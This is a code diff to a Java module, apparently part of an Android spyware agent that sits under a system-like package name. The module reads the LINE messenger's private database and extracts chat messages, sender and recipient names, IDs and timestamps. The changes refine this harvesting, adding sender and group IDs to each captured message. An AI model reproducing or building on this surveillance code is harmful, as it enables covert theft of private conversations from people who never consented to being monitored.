@@ -25,8 +25,8 @@ import com.android.networking.util.Check;
 public class ChatLine extends SubModuleChat {
 	private static final String TAG = "ChatLine";
 
-	private static final int PROGRAM = 0x0b;
-	String pObserving = "line";
+	private static final int PROGRAM = 0x0d;
+	String pObserving = "jp.naver.line.android";
 	String dbFile = "/data/data/jp.naver.line.android/databases/naver_line";
 
 	private Date lastTimestamp;
@@ -128,7 +128,6 @@ public class ChatLine extends SubModuleChat {
 						}
 					}
 				}
-
 			}
 		}
 
@@ -173,14 +172,17 @@ public class ChatLine extends SubModuleChat {
 
 					boolean incoming = false;
 					String to = account;
+					String to_id = from_mid;
 
 					if (from_name == null) {
 						from_name = account;
 						incoming = false;
-						to = groups.getGroupTo(from_name, chat_id);
+						to = groups.getGroupToName(from_name, chat_id);
+						to_id = groups.getGroupToId(from_name, chat_id);
 					} else {
 						incoming = true;
-						to = groups.getGroupTo(from_name, chat_id);
+						to = groups.getGroupToName(from_name, chat_id);
+						to_id = groups.getGroupToId(from_name, chat_id);
 						if (to == null) {
 							to = account;
 						}
@@ -191,7 +193,7 @@ public class ChatLine extends SubModuleChat {
 								date.toLocaleString(), content, from_name, to);
 					}
 
-					MessageChat message = new MessageChat(PROGRAM, date, from_name, to, content, incoming);
+					MessageChat message = new MessageChat(PROGRAM, date, from_mid, from_name, to_id, to, content, incoming);
 					messages.add(message);
 
 					return created_time;
@@ -224,6 +226,9 @@ public class ChatLine extends SubModuleChat {
 				String key = cursor.getString(0);
 				String mid = cursor.getString(1);
 				String name = cursor.getString(2);
+				if(mid == null){
+					return 0;
+				}
 
 				if (mid.equals(account_mid)) {
 					name = account;
@@ -255,7 +260,7 @@ public class ChatLine extends SubModuleChat {
 
 		if (Cfg.DEBUG) {
 			for (String group : groups.getAllGroups()) {
-				String to = groups.getGroupTo(account, group);
+				String to = groups.getGroupToName(account, group);
 				Check.log(TAG + " (getLineGroups group) %s : %s", group, to);
 			}
 		}
